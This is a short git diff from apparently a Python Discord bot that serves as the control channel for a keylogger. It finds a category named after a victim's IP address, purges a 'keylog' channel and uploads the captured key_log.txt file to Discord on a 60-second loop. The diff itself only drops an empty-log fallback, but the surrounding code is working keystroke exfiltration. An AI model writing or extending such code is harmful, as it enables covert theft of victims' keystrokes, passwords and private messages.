@@ -431,9 +431,9 @@ async def on_ready():
     async def update_keylog():
         category = nextcord.utils.get(guild.categories, name=str(ip))
         channel = nextcord.utils.get(category.text_channels, name="keylog")
+
         await channel.purge()
-        if log == "":
-            log = "No keys pressed."
+        
         await channel.send(file=nextcord.File(os.path.join(target_path, "skibidi-main", "key_log.txt")))
 
     @tasks.loop(seconds=60)
